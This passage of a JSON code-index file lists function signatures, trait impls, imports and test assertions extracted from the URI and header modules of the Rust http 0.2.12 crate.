          "impl PartialOrd<PathAndQuery> for str {",
          "impl PartialOrd<String> for PathAndQuery {",
          "impl PartialOrd<PathAndQuery> for String {"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use std::str::FromStr;",
          "use std::{cmp, fmt, hash, str};",
          "use bytes::Bytes;",
          "use super::{ErrorKind, InvalidUri};",
          "use crate::byte_str::ByteStr;",
          "use super::*;"
        ],
        "macros": [
          "debug_assert_eq!(query, NONE);",
          "/// assert_eq!(v.path(), \"/hello\");",
          "/// assert_eq!(v.query(), Some(\"world\"));",
          "if_downcast_into!(T, Bytes, src, {",
          "/// assert_eq!(path_and_query.path(), \"/hello/world\");",
          "/// assert_eq!(path_and_query.query(), Some(\"key=value&foo=bar\"));",
          "/// assert!(path_and_query.query().is_none());",
          "/// assert_eq!(path_and_query.as_str(), \"/hello/world?key=value&foo=bar\");",
          "/// assert_eq!(path_and_query.as_str(), \"/hello/world\");",
          "b'/' | b'*' => write!(fmt, \"{}\", &self.data[..]),",
          "_ => write!(fmt, \"/{}\", &self.data[..]),",
          "write!(fmt, \"/\")",
          "assert_eq!(p1, p2);",
          "assert_eq!(p2, p1);",
          "assert_ne!(p1, p2);",
          "assert_ne!(p2, p1);",
          "assert_eq!(&path_and_query, \"/hello/world&foo=bar\");",
          "assert_eq!(\"/hello/world&foo=bar\", &path_and_query);",
          "assert_eq!(path_and_query, \"/hello/world&foo=bar\");",
          "assert_eq!(\"/hello/world&foo=bar\", path_and_query);",
          "assert_ne!(&path_and_query, \"/hello&foo=bar\");",
          "assert_ne!(\"/hello&foo=bar\", &path_and_query);",
          "assert_ne!(path_and_query, \"/hello&foo=bar\");",
          "assert_ne!(\"/hello&foo=bar\", path_and_query);",
          "assert_eq!(path_and_query, \"/hello/world&foo=bar\".to_string());",
          "assert_eq!(\"/hello/world&foo=bar\".to_string(), path_and_query);",
          "assert_ne!(path_and_query, \"/hello&foo=bar\".to_string());",
          "assert_ne!(\"/hello&foo=bar\".to_string(), path_and_query);",
          "assert!(p1 < p2);",
          "assert!(p2 > p1);",
          "assert!(&path_and_query < \"/c/world&foo=bar\");",
          "assert!(\"/c/world&foo=bar\" > &path_and_query);",
          "assert!(&path_and_query > \"/a/world&foo=bar\");",
          "assert!(\"/a/world&foo=bar\" < &path_and_query);",
          "assert!(path_and_query < \"/c/world&foo=bar\");",
          "assert!(\"/c/world&foo=bar\" > path_and_query);",
          "assert!(path_and_query > \"/a/world&foo=bar\");",
          "assert!(\"/a/world&foo=bar\" < path_and_query);",
          "assert!(path_and_query < \"/c/world&foo=bar\".to_string());",
          "assert!(\"/c/world&foo=bar\".to_string() > path_and_query);",
          "assert!(path_and_query > \"/a/world&foo=bar\".to_string());",
          "assert!(\"/a/world&foo=bar\".to_string() < path_and_query);",
          "assert_eq!(\"/a%20b\", pq(\"/a%20b?r=1\").path());",
          "assert_eq!(\"qr=%31\", pq(\"/a/b?qr=%31\").query().unwrap());",
          "assert_eq!(\"/a%%b\", pq(\"/a%%b?r=1\").path());",
          "assert_eq!(\"/aaa%\", pq(\"/aaa%\").path());",
          "assert_eq!(\"/aaa%\", pq(\"/aaa%?r=1\").path());",
          "assert_eq!(\"/aa%2\", pq(\"/aa%2\").path());",
          "assert_eq!(\"/aa%2\", pq(\"/aa%2?r=1\").path());",
          "assert_eq!(\"qr=%3\", pq(\"/a/b?qr=%3\").query().unwrap());",
          "assert_eq!(r#\"/{\"bread\":\"baguette\"}\"#, pq(r#\"/{\"bread\":\"baguette\"}\"#).path());",
          "s.parse().expect(&format!(\"parsing {}\", s))"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 33
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/uri/mod.rs",
        "function_defs": [
          "fn from_shared(s: Bytes) -> Result<Uri, InvalidUri> {",
          "fn has_path(&self) -> bool {",
          "fn try_from(t: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(t: &'a str) -> Result<Self, Self::Error> {",
          "fn try_from(t: &'a String) -> Result<Self, Self::Error> {",
          "fn try_from(t: String) -> Result<Self, Self::Error> {",
          "fn try_from(vec: Vec<u8>) -> Result<Self, Self::Error> {",
          "fn try_from(src: Parts) -> Result<Self, Self::Error> {",
          "fn try_from(src: &'a Uri) -> Result<Self, Self::Error> {",
          "fn from(authority: Authority) -> Self {",
          "fn from(path_and_query: PathAndQuery) -> Self {",
          "fn from(src: Uri) -> Self {",
          "fn parse_full(mut s: Bytes) -> Result<Uri, InvalidUri> {",
          "fn from_str(s: &str) -> Result<Uri, InvalidUri> {",
          "fn eq(&self, other: &Uri) -> bool {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, uri: &Uri) -> bool {",
          "fn eq(&self, other: &&'a str) -> bool {",
          "fn eq(&self, uri: &Uri) -> bool {",
          "fn default() -> Uri {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(src: ErrorKind) -> InvalidUri {",
          "fn from(src: ErrorKind) -> InvalidUriParts {",
          "fn s(&self) -> &str {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn hash<H>(&self, state: &mut H)"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Uri {",
          "impl TryFrom<String> for Uri {",
          "impl TryFrom<Parts> for Uri {",
          "impl From<Authority> for Uri {",
          "impl From<PathAndQuery> for Uri {",
          "impl From<Uri> for Parts {",
          "impl FromStr for Uri {",
          "impl PartialEq for Uri {",
          "impl PartialEq<str> for Uri {",
          "impl PartialEq<Uri> for str {",
          "impl Eq for Uri {}",
          "impl Default for Uri {",
          "impl fmt::Display for Uri {",
          "impl fmt::Debug for Uri {",
          "impl From<ErrorKind> for InvalidUri {",
          "impl From<ErrorKind> for InvalidUriParts {",
          "impl InvalidUri {",
          "impl fmt::Display for InvalidUri {",
          "impl Error for InvalidUri {}",
          "impl fmt::Display for InvalidUriParts {",
          "impl Error for InvalidUriParts {}",
          "impl Hash for Uri {"
        ],
        "uses": [
          "use crate::byte_str::ByteStr;",
          "use std::convert::TryFrom;",
          "use bytes::Bytes;",
          "use std::error::Error;",
          "use std::hash::{Hash, Hasher};",
          "use std::str::{self, FromStr};",
          "use std::{fmt, u16, u8};",
          "use self::scheme::Scheme2;",
          "use self::ErrorKind::*;"
        ],
        "macros": [
          "//! assert_eq!(uri.path(), \"/foo/bar\");",
          "//! assert_eq!(uri.query(), Some(\"baz\"));",
          "//! assert_eq!(uri.host(), None);",
          "//! assert_eq!(uri.scheme_str(), Some(\"https\"));",
          "//! assert_eq!(uri.host(), Some(\"www.rust-lang.org\"));",
          "//! assert_eq!(uri.path(), \"/install.html\");",
          "/// assert_eq!(uri.path(), \"/foo/bar\");",
          "/// assert_eq!(uri.query(), Some(\"baz\"));",
          "/// assert_eq!(uri.host(), None);",
          "/// assert_eq!(uri.scheme_str(), Some(\"https\"));",
          "/// assert_eq!(uri.host(), Some(\"www.rust-lang.org\"));",
          "/// assert_eq!(uri.path(), \"/install.html\");",
          "/// assert_eq!(uri.path(), \"/foo\");",
          "/// assert!(uri.scheme().is_none());",
          "/// assert!(uri.authority().is_none());",
          "/// assert_eq!(uri.scheme().unwrap().as_str(), \"http\");",
          "/// assert_eq!(uri.authority().unwrap(), \"foo.com\");",
          "/// assert_eq!(uri.path(), \"/foo\");",
          "if_downcast_into!(T, Bytes, src, {",
          "/// assert_eq!(uri.host().unwrap(), \"example.com\");",
          "/// assert_eq!(uri.path(), \"/foo\");",
          "Err(e) => panic!(\"static str is not valid URI: {}\", e),",
          "/// assert_eq!(parts.path_and_query.unwrap(), \"/foo\");",
          "/// assert!(parts.scheme.is_none());",
          "/// assert!(parts.authority.is_none());",
          "/// assert_eq!(uri.path(), \"/hello/world\");",
          "/// assert_eq!(uri.path(), \"/hello/world\");",
          "/// assert_eq!(uri.scheme(), Some(&Scheme::HTTP));",
          "/// assert!(uri.scheme().is_none());",
          "/// assert_eq!(uri.scheme_str(), Some(\"http\"));",
          "/// assert_eq!(uri.authority().map(|a| a.as_str()), Some(\"example.org:80\"));",
          "/// assert!(uri.authority().is_none());",
          "/// assert_eq!(uri.host(), Some(\"example.org\"));",
          "/// assert!(uri.host().is_none());",
          "/// assert_eq!(port.as_u16(), 80);",
          "/// assert!(uri.port().is_none());",
          "/// assert!(uri.port().is_none());",
          "/// assert_eq!(uri.port_u16(), Some(80));",
          "/// assert_eq!(uri.query(), Some(\"key=value\"));",
          "/// assert_eq!(uri.query(), Some(\"key=value&foo=bar\"));",
          "/// assert!(uri.query().is_none());",
          "write!(f, \"{}://\", scheme)?;",
          "write!(f, \"{}\", authority)?;",
          "write!(f, \"{}\", self.path())?;",
          "write!(f, \"?{}\", query)?;"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Debug, Default)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Eq, PartialEq)]"
        ],
        "error_handling": 62
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/uri/tests.rs",
        "function_defs": [
          "fn test_char_table() {",
          "fn $test_name() {",
          "fn test_uri_parse_error() {",
          "fn err(s: &str) {",
          "fn test_max_uri_len() {",
          "fn test_overflowing_scheme() {",
          "fn test_max_length_scheme() {",
          "fn test_uri_to_path_and_query() {",
          "fn test_authority_uri_parts_round_trip() {",
          "fn test_partial_eq_path_with_terminating_questionmark() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::str::FromStr;",
          "use super::{ErrorKind, InvalidUri, Port, Uri, URI_CHARS};"
        ],
        "macros": [
          "assert_eq!(i, v as usize);",
          "panic!(\"parse error {:?} from {:?}\", err, orig_str);",
          "assert_eq!(uri.$method(), $value, \"{}: uri = {:?}\", stringify!($method), uri);",
          "assert_eq!(uri, orig_str, \"partial eq to original str\");",
          "assert_eq!(uri, uri.clone(), \"clones are equal\");",
          "assert_eq!(new_uri, orig_str, \"round trip still equals original str\");",
          "assert_eq!(uri, *alt);",
          "assert_eq!(uri, other);",
          "scheme = part!(\"http\"),",
          "authority = part!(\"127.0.0.1:61761\"),",
          "scheme = part!(\"https\"),",
          "authority = part!(\"127.0.0.1:61761\"),",
          "authority = part!(\"localhost\"),",
          "authority = part!(\"S\"),",
          "authority = part!(\"localhost:3000\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"127.0.0.1:80\"),",
          "scheme = part!(\"https\"),",
          "authority = part!(\"127.0.0.1:443\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"127.0.0.1\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"127.0.0.1\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"127.0.0.1\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"127.0.0.1\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"127.0.0.1\"),",
          "authority = part!(\"thequickbrownfoxjumpedoverthelazydogtofindthelargedangerousdr",
          "authority = part!(\"thequickbrownfoxjumpedoverthelazydogtofindthelargedangerousdr",
          "scheme = part!(\"http\"),",
          "authority = part!(\"a:b@127.0.0.1:1234\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"a:b@127.0.0.1\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"a@127.0.0.1\"),",
          "authority = part!(\"user@localhost:3000\"),",
          "authority = part!(\"user:pass@localhost:3000\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"[2001:0db8:85a3:0000:0000:8a2e:0370:7334]\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"[::1]\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"[::]\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"[2001:db8::2:1]\"),",
          "scheme = part!(\"http\"),",
          "authority = part!(\"[2001:0db8:85a3:0000:0000:8a2e:0370:7334]:8008\"),",
          "assert_eq!(res.unwrap_err().0, ErrorKind::TooLong);",
          "assert_eq!(res.unwrap_err().0, ErrorKind::SchemeTooLong);",
          "assert_eq!(uri.scheme_str().unwrap().len(), 64);",
          "assert_eq!(s, case.1);",
          "assert_eq!(uri, s);",
          "assert_eq!(uri.to_string(), s);",
          "assert_eq!(uri2, s);",
          "assert_eq!(uri2.to_string(), s);",
          "assert_eq!(uri, a);"
        ],
        "derives": [],
        "error_handling": 29
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/uri/authority.rs",
        "function_defs": [
          "fn parse_non_empty(s: &[u8]) -> Result<usize, InvalidUri> {",
          "fn as_ref(&self) -> &str {",
          "fn eq(&self, other: &Authority) -> bool {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, other: &Authority) -> bool {",
          "fn eq(&self, other: &Authority) -> bool {",
          "fn eq(&self, other: &&'a str) -> bool {",
          "fn eq(&self, other: &String) -> bool {",
          "fn eq(&self, other: &Authority) -> bool {",
          "fn partial_cmp(&self, other: &Authority) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &str) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &Authority) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &Authority) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &&'a str) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &String) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &Authority) -> Option<cmp::Ordering> {",
          "fn hash<H>(&self, state: &mut H)",
          "fn try_from(s: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(s: &'a str) -> Result<Self, Self::Error> {",
          "fn try_from(vec: Vec<u8>) -> Result<Self, Self::Error> {",
          "fn try_from(t: String) -> Result<Self, Self::Error> {",
          "fn from_str(s: &str) -> Result<Self, InvalidUri> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn host(auth: &str) -> &str {",
          "fn create_authority<B, F>(b: B, f: F) -> Result<Authority, InvalidUri>",
          "fn parse_empty_string_is_error() {",
          "fn equal_to_self_of_same_authority() {",
          "fn not_equal_to_self_of_different_authority() {",
          "fn equates_with_a_str() {",
          "fn from_static_equates_with_a_str() {",
          "fn not_equal_with_a_str_of_a_different_authority() {",
          "fn equates_with_a_string() {",
          "fn equates_with_a_string_of_a_different_authority() {",
          "fn compares_to_self() {",
          "fn compares_with_a_str() {",
          "fn compares_with_a_string() {",
          "fn allows_percent_in_userinfo() {",
          "fn rejects_percent_in_hostname() {",
          "fn allows_percent_in_ipv6_address() {",
          "fn reject_obviously_invalid_ipv6_address() {",
          "fn rejects_percent_outside_ipv6_address() {",
          "fn rejects_invalid_utf8() {",
          "fn rejects_invalid_use_of_brackets() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Authority {",
          "impl AsRef<str> for Authority {",
          "impl PartialEq for Authority {",
          "impl Eq for Authority {}",
          "impl PartialEq<str> for Authority {",
          "impl PartialEq<Authority> for str {",
          "impl PartialEq<String> for Authority {",
          "impl PartialEq<Authority> for String {",
          "impl PartialOrd for Authority {",
          "impl PartialOrd<str> for Authority {",
          "impl PartialOrd<Authority> for str {",
          "impl PartialOrd<String> for Authority {",
          "impl PartialOrd<Authority> for String {",
          "impl Hash for Authority {",
          "impl TryFrom<Vec<u8>> for Authority {",
          "impl TryFrom<String> for Authority {",
          "impl FromStr for Authority {",
          "impl fmt::Debug for Authority {",
          "impl fmt::Display for Authority {"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use std::hash::{Hash, Hasher};",
          "use std::str::FromStr;",
          "use std::{cmp, fmt, str};",
          "use bytes::Bytes;",
          "use super::{ErrorKind, InvalidUri, Port, URI_CHARS};",
          "use crate::byte_str::ByteStr;",
          "use super::*;"
        ],
        "macros": [
          "/// assert_eq!(authority.host(), \"example.com\");",
          "if_downcast_into!(T, Bytes, src, {",
          "/// assert_eq!(authority.host(), \"example.org\");",
          "/// assert_eq!(port.as_u16(), 80);",
          "/// assert_eq!(port.as_str(), \"80\");",
          "/// assert!(authority.port().is_none());",
          "/// assert_eq!(authority.port_u16(), Some(80));",
          "/// assert_eq!(authority, \"hello.coM\");",
          "/// assert_eq!(\"hello.com\", authority);",
          "/// assert!(authority < \"ghi.com\");",
          "/// assert!(authority > \"abc.com\");",
          "/// assert_eq!(a, b);",
          "assert_eq!(err.0, ErrorKind::Empty);",
          "assert_eq!(authority1, authority2);",
          "assert_eq!(authority2, authority1);",
          "assert_ne!(authority1, authority2);",
          "assert_ne!(authority2, authority1);",
          "assert_eq!(&authority, \"EXAMPLE.com\");",
          "assert_eq!(\"EXAMPLE.com\", &authority);",
          "assert_eq!(authority, \"EXAMPLE.com\");",
          "assert_eq!(\"EXAMPLE.com\", authority);",
          "assert_eq!(authority, \"example.com\");",
          "assert_ne!(&authority, \"test.com\");",
          "assert_ne!(\"test.com\", &authority);",
          "assert_ne!(authority, \"test.com\");",
          "assert_ne!(\"test.com\", authority);",
          "assert_eq!(authority, \"EXAMPLE.com\".to_string());",
          "assert_eq!(\"EXAMPLE.com\".to_string(), authority);",
          "assert_ne!(authority, \"test.com\".to_string());",
          "assert_ne!(\"test.com\".to_string(), authority);",
          "assert!(authority1 < authority2);",
          "assert!(authority2 > authority1);",
          "assert!(&authority < \"ghi.com\");",
          "assert!(\"ghi.com\" > &authority);",
          "assert!(&authority > \"abc.com\");",
          "assert!(\"abc.com\" < &authority);",
          "assert!(authority < \"ghi.com\");",
          "assert!(\"ghi.com\" > authority);",
          "assert!(authority > \"abc.com\");",
          "assert!(\"abc.com\" < authority);",
          "assert!(authority < \"ghi.com\".to_string());",
          "assert!(\"ghi.com\".to_string() > authority);",
          "assert!(authority > \"abc.com\".to_string());",
          "assert!(\"abc.com\".to_string() < authority);",
          "assert_eq!(authority, authority_str);",
          "assert_eq!(err.0, ErrorKind::InvalidAuthority);",
          "assert_eq!(err.0, ErrorKind::InvalidAuthority);",
          "assert_eq!(result, authority_str);",
          "assert_eq!(err.0, ErrorKind::InvalidAuthority);",
          "assert_eq!(err.0, ErrorKind::InvalidAuthority);",
          "assert_eq!(err.0, ErrorKind::InvalidAuthority);",
          "assert_eq!(err.0, ErrorKind::InvalidUriChar);",
          "assert_eq!(err.0, ErrorKind::InvalidUriChar);",
          "assert_eq!(err.0, ErrorKind::InvalidAuthority);",
          "assert_eq!(err.0, ErrorKind::InvalidAuthority);"
        ],
        "derives": [
          "#[derive(Clone)]"
        ],
        "error_handling": 31
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/uri/builder.rs",
        "function_defs": [
          "fn map<F>(self, func: F) -> Self",
          "fn default() -> Builder {",
          "fn build_from_str() {",
          "fn build_from_string() {",
          "fn build_from_string_ref() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Builder {",
          "impl Default for Builder {"
        ],
        "uses": [
          "use std::convert::{TryFrom, TryInto};",
          "use super::{Authority, Parts, PathAndQuery, Scheme};",
          "use crate::Uri;",
          "use super::*;"
        ],
        "macros": [
          "assert_eq!(uri.scheme_str(), Some(\"http\"));",
          "assert_eq!(uri.authority().unwrap().host(), \"hyper.rs\");",
          "assert_eq!(uri.path(), \"/foo\");",
          "assert_eq!(uri.query(), Some(\"a=1\"));",
          ".path_and_query(format!(\"/foo?a={}\", i))",
          "let expected_query = format!(\"a={}\", i);",
          "assert_eq!(uri.path(), \"/foo\");",
          "assert_eq!(uri.query(), Some(expected_query.as_str()));",
          "let p_a_q = format!(\"/foo?a={}\", i);",
          "let expected_query = format!(\"a={}\", i);",
          "assert_eq!(uri.path(), \"/foo\");",
          "assert_eq!(uri.query(), Some(expected_query.as_str()));"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/header/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/header/value.rs",
        "function_defs": [
          "fn from_shared(src: Bytes) -> Result<HeaderValue, InvalidHeaderValue> {",
          "fn try_from_generic<T: AsRef<[u8]>, F: FnOnce(T) -> Bytes>(src: T, into: F) -> Result<HeaderValue, InvalidHeaderValue> {",
          "fn as_ref(&self) -> &[u8] {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(h: HeaderName) -> HeaderValue {",
          "fn from(num: $t) -> HeaderValue {",
          "fn $name() {",
          "fn it_can_insert_header_name_as_header_value() {",
          "fn from_str(s: &str) -> Result<HeaderValue, Self::Err> {",
          "fn from(t: &'a HeaderValue) -> Self {",
          "fn try_from(t: &'a str) -> Result<Self, Self::Error> {",
          "fn try_from(s: &'a String) -> Result<Self, Self::Error> {",
          "fn try_from(t: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(t: String) -> Result<Self, Self::Error> {",
          "fn try_from(vec: Vec<u8>) -> Result<Self, Self::Error> {",
          "fn it_converts_using_try_from() {",
          "fn is_valid(b: u8) -> bool {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn eq(&self, other: &HeaderValue) -> bool {",
          "fn partial_cmp(&self, other: &HeaderValue) -> Option<cmp::Ordering> {",
          "fn cmp(&self, other: &Self) -> cmp::Ordering {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, other: &[u8]) -> bool {",
          "fn partial_cmp(&self, other: &str) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &[u8]) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &HeaderValue) -> bool {",
          "fn eq(&self, other: &HeaderValue) -> bool {",
          "fn partial_cmp(&self, other: &HeaderValue) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &HeaderValue) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &String) -> bool {",
          "fn partial_cmp(&self, other: &String) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &HeaderValue) -> bool {",
          "fn partial_cmp(&self, other: &HeaderValue) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &HeaderValue) -> bool {",
          "fn partial_cmp(&self, other: &HeaderValue) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &&'a T) -> bool {",
          "fn partial_cmp(&self, other: &&'a T) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &HeaderValue) -> bool {",
          "fn partial_cmp(&self, other: &HeaderValue) -> Option<cmp::Ordering> {",
          "fn test_try_from() {",
          "fn test_debug() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl HeaderValue {",
          "impl AsRef<[u8]> for HeaderValue {",
          "impl fmt::Debug for HeaderValue {",
          "impl From<HeaderName> for HeaderValue {",
          "impl From<$t> for HeaderValue {",
          "impl FromStr for HeaderValue {",
          "impl TryFrom<String> for HeaderValue {",
          "impl TryFrom<Vec<u8>> for HeaderValue {",
          "impl fmt::Debug for InvalidHeaderValue {",
          "impl fmt::Display for InvalidHeaderValue {",
          "impl Error for InvalidHeaderValue {}",
          "impl fmt::Display for ToStrError {",
          "impl Error for ToStrError {}",
          "impl PartialEq for HeaderValue {",
          "impl Eq for HeaderValue {}",
          "impl PartialOrd for HeaderValue {",
          "impl Ord for HeaderValue {",
          "impl PartialEq<str> for HeaderValue {",
          "impl PartialEq<[u8]> for HeaderValue {",
          "impl PartialOrd<str> for HeaderValue {",
          "impl PartialOrd<[u8]> for HeaderValue {",
          "impl PartialEq<HeaderValue> for str {",
          "impl PartialEq<HeaderValue> for [u8] {",
          "impl PartialOrd<HeaderValue> for str {",
          "impl PartialOrd<HeaderValue> for [u8] {",
          "impl PartialEq<String> for HeaderValue {",
          "impl PartialOrd<String> for HeaderValue {",
          "impl PartialEq<HeaderValue> for String {",
          "impl PartialOrd<HeaderValue> for String {"
        ],
        "uses": [
          "use bytes::{Bytes, BytesMut};",
          "use std::convert::TryFrom;",
          "use std::error::Error;",
          "use std::fmt::Write;",
          "use std::str::FromStr;",
          "use std::{cmp, fmt, mem, str};",
          "use crate::header::name::HeaderName;",
          "use super::*;",
          "use crate::header::map::HeaderMap;",
          "use crate::header::name;",
          "use super::*;",
          "use crate::header::name;"
        ],
        "macros": [
          "/// assert_eq!(val, \"hello\");",
          "/// assert_eq!(val, \"hello\");",
          "/// assert!(val.is_err());",
          "/// assert_eq!(val, HeaderValue::from_bytes(b\"accept\").unwrap());",
          "/// assert_eq!(val, &b\"hello\\xfa\"[..]);",
          "/// assert!(val.is_err());",
          "if_downcast_into!(T, Bytes, src, {",
          "if cfg!(debug_assertions) {",
          "panic!(\"HeaderValue::from_maybe_shared_unchecked() with invalid bytes\");",
          "if_downcast_into!(T, Bytes, src, {",
          "/// assert_eq!(val.to_str().unwrap(), \"hello\");",
          "/// assert_eq!(val.len(), 5);",
          "/// assert!(val.is_empty());",
          "/// assert!(!val.is_empty());",
          "/// assert_eq!(val.as_bytes(), b\"hello\");",
          "/// assert!(val.is_sensitive());",
          "/// assert!(!val.is_sensitive());",
          "/// assert!(val.is_sensitive());",
          "/// assert!(!val.is_sensitive());",
          "write!(f, \"\\\\x{:x}\", b)?;",
          "assert_eq!(val, &n.to_string());",
          "assert_eq!(val, &n.to_string());",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "let actual = format!(\"{:?}\", val);",
          "assert_eq!(expected, actual);",
          "assert_eq!(\"Sensitive\", format!(\"{:?}\", sensitive));"
        ],
        "derives": [
          "#[derive(Clone, Hash)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 22
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/header/name.rs",
        "function_defs": [
          "fn as_str(&self) -> &'static str {",
          "fn test_parse_standard_headers() {",
          "fn test_standard_headers_into_bytes() {",
          "fn parse_hdr<'a>(",
          "fn from(hdr: StandardHeader) -> HdrName<'a> {",
          "fn from_str(s: &str) -> Result<HeaderName, InvalidHeaderName> {",
          "fn as_ref(&self) -> &str {",
          "fn as_ref(&self) -> &[u8] {",
          "fn borrow(&self) -> &str {",
          "fn fmt(&self, fmt: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, fmt: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(src: &'a HeaderName) -> HeaderName {",
          "fn from(repr: Repr<T>) -> Bytes {",
          "fn from(Custom(inner): Custom) -> Bytes {",
          "fn try_from(s: &'a str) -> Result<Self, Self::Error> {",
          "fn try_from(s: &'a String) -> Result<Self, Self::Error> {",
          "fn try_from(s: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(s: String) -> Result<Self, Self::Error> {",
          "fn try_from(vec: Vec<u8>) -> Result<Self, Self::Error> {",
          "fn from(src: StandardHeader) -> HeaderName {",
          "fn from(src: Custom) -> HeaderName {",
          "fn eq(&self, other: &&'a HeaderName) -> bool {",
          "fn eq(&self, other: &HeaderName) -> bool {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, other: &HeaderName) -> bool {",
          "fn eq(&self, other: &&'a str) -> bool {",
          "fn eq(&self, other: &HeaderName) -> bool {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn custom(buf: &'a [u8], lower: bool) -> HdrName<'a> {",
          "fn from(src: HdrName<'a>) -> HeaderName {",
          "fn eq(&self, other: &HdrName<'a>) -> bool {",
          "fn hash<H: Hasher>(&self, hasher: &mut H) {",
          "fn hash<H: Hasher>(&self, hasher: &mut H) {",
          "fn eq_ignore_ascii_case(lower: &[u8], s: &[u8]) -> bool {",
          "fn uninit_u8_array() -> [MaybeUninit<u8>; SCRATCH_BUF_SIZE] {",
          "fn test_bounds() {",
          "fn check_bounds<T: Sync + Send>() {}",
          "fn test_parse_invalid_headers() {",
          "fn test_invalid_name_lengths() {",
          "fn test_static_invalid_name_lengths() {",
          "fn test_from_hdr_name() {",
          "fn test_eq_hdr_name() {",
          "fn test_from_static_std() {",
          "fn test_from_static_std_uppercase() {",
          "fn test_from_static_std_symbol() {",
          "fn test_from_static_custom_short() {",
          "fn test_from_static_custom_short_uppercase() {",
          "fn test_from_static_custom_short_symbol() {",
          "fn test_from_static_custom_long() {",
          "fn test_from_static_custom_long_uppercase() {",
          "fn test_from_static_custom_long_symbol() {",
          "fn test_from_static_custom_single_char() {",
          "fn test_from_static_empty() {",
          "fn test_all_tokens() {",
          "fn test_from_lowercase() {"
        ],
        "struct_defs": [
          "struct Custom(ByteStr);",
          "struct MaybeLower<'a> {"
        ],
        "impl_blocks": [
          "impl StandardHeader {",
          "impl HeaderName {",
          "impl FromStr for HeaderName {",
          "impl AsRef<str> for HeaderName {",
          "impl AsRef<[u8]> for HeaderName {",
          "impl Borrow<str> for HeaderName {",
          "impl fmt::Debug for HeaderName {",
